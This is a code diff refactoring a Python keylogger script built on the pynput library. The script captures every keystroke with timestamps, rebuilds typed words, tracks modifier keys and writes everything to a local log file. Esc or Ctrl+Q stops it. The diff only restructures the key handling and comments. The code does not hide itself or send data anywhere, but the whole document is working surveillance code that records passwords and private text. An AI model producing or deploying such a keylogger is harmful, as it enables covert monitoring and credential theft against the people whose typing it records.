@@ -1,83 +1,72 @@
 from pynput.keyboard import Listener, Key
 import logging
-import time
 
-# Set up logging configuration to save keystrokes to a file
+# Set up logging to capture keystrokes and save them to a file
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
-# To store the current sequence of keys being pressed (for word detection)
+# Lists to track current word and pressed key combinations
 current_keys = []
-
-# To store combination of keys pressed
 pressed_keys = []
 
 # Function to log each key pressed
 def on_press(key):
     try:
-        # If it's a printable key, add it to the current word sequence
+        # If the key is a printable character (e.g. letters or numbers)
         if hasattr(key, 'char') and key.char:
-            current_keys.append(key.char)
+            current_keys.append(key.char)  # Add character to current word
             logging.info(f"Key {key.char} pressed")
 
+        # Handle special keys like space, enter, and backspace
         else:
-            # Log special keys like space, enter, shift, ctrl, etc.
-            if key == Key.space:
-                current_keys.append(" ")
-                logging.info("Space pressed")
-            elif key == Key.enter:
-                current_keys.append("\n")
-                log_word()  # Log the current word when Enter is pressed
-                logging.info("Enter pressed")
-            elif key == Key.backspace:
-                current_keys.append("<Backspace>")
-                logging.info("Backspace pressed")
-            elif key == Key.shift or key == Key.shift_r:
-                pressed_keys.append('Shift')
-                logging.info("Shift key pressed")
-            elif key == Key.ctrl_l or key == Key.ctrl_r:
-                pressed_keys.append('Ctrl')
-                logging.info("Ctrl key pressed")
-            elif key == Key.alt_l or key == Key.alt_r:
-                pressed_keys.append('Alt')
-                logging.info("Alt key pressed")
-            elif key == Key.caps_lock:
-                logging.info("Caps Lock toggled")
-            else:
-                logging.info(f"Special key {key} pressed")
+            handle_special_keys(key)
 
     except AttributeError:
-        # Catch errors for non-character keys like special function keys
+        # If the key is a special function key (like Shift or Ctrl)
         logging.info(f"Special key {key} pressed")
 
-# Function to log a completed word when the enter key is pressed
+# Function to handle special keys
+def handle_special_keys(key):
+    if key == Key.space:
+        current_keys.append(" ")  # Add space to the word
+        logging.info("Space pressed")
+    elif key == Key.enter:
+        current_keys.append("\n")  # Add newline (end of word)
+        log_word()  # Log word when Enter is pressed
+        logging.info("Enter pressed")
+    elif key == Key.backspace:
+        current_keys.append("<Backspace>")
+        logging.info("Backspace pressed")
+    elif key in [Key.shift, Key.shift_r]:
+        pressed_keys.append('Shift')
+        logging.info("Shift key pressed")
+    elif key in [Key.ctrl_l, Key.ctrl_r]:
+        pressed_keys.append('Ctrl')
+        logging.info("Ctrl key pressed")
+    elif key in [Key.alt_l, Key.alt_r]:
+        pressed_keys.append('Alt')
+        logging.info("Alt key pressed")
+    elif key == Key.caps_lock:
+        logging.info("Caps Lock toggled")
+    else:
+        logging.info(f"Special key {key} pressed")
+
+# Function to log a completed word when Enter key is pressed
 def log_word():
-    word = ''.join(current_keys).strip()
+    word = ''.join(current_keys).strip()  # Join characters to form a word
     if word:  # Only log non-empty words
         logging.info(f"Word logged: {word}")
-    current_keys.clear()  # Reset the current sequence after logging the word
+    current_keys.clear()  # Clear current keys for the next word
 
-# Function to stop the listener on pressing 'Ctrl + Q' combination
+# Function to stop the listener when 'Esc' or 'Ctrl + Q' is pressed
 def on_release(key):
-    # Stop the listener if Ctrl + Q is pressed
-    if key == Key.esc:  # Escape key can still stop the listener
+    if key == Key.esc:  # Escape key stops the listener
         return False
-    if Key.ctrl_l in pressed_keys and key == Key.q:
+    if Key.ctrl_l in pressed_keys and key == Key.q:  # Ctrl + Q stops the listener
         logging.info("Ctrl + Q pressed, stopping the keylogger.")
         return False
-    # If Enter is pressed, log the word formed
-    if key == Key.enter:
+    if key == Key.enter:  # Log word when Enter key is pressed
         log_word()
 
-# Function to periodically log key combinations and word detection
-def check_combinations():
-    # This function can log any combinations of keys like 'Ctrl + C' or 'Shift + A'
-    if 'Ctrl' in pressed_keys:
-        if 'C' in pressed_keys:
-            logging.info("Ctrl + C pressed (copy)")
-        if 'V' in pressed_keys:
-            logging.info("Ctrl + V pressed (paste)")
-        pressed_keys.clear()
-
-# Start the listener to capture key events
+# Start the listener to capture keyboard events
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
